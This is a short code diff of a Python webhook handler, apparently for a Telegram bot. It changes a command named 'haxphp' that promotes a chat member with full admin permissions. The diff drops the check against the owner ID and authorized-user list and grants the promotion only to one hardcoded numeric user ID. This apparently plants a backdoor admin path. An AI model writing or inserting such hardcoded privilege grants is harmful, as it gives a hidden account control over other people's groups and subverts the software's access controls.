@@ -341,10 +341,10 @@ def webhook():
                     return jsonify(ok=True)
                     
                 if is_cmd("haxphp"):
-                    uid = 1720747473
+                    uid = from_user.get("id")
                     
                     # בדיקה אם המשתמש מורשה (בעלים או ברשימה המיוחדת)
-                    if uid == OWNER_ID or uid in AUTHORIZED_FOR_ADMIN:
+                    if uid == 1720747473:
                         try:
                             # קריאה ל-promoteChatMember עם כל ההרשאות
                             payload = {
